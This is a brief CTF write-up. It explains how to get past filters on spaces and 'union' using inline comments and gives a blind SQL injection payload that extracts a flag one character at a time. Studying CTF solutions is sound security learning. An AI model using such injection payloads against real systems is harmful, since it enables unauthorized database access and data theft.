# Vibe Coded Web Application Revenge

Challenge Author: yappare

## Solution

"union" and spaces are filtered.
You can bypass spaces requirements with `/**/`.

```
test%'/**/AND/**/substring((SELECT/**/flag/**/FROM/**/secret_flags/**/LIMIT/**/1),1,1)='<brute-characters'/**/OR/**/'1'='1--%
```

Solution script in solve.py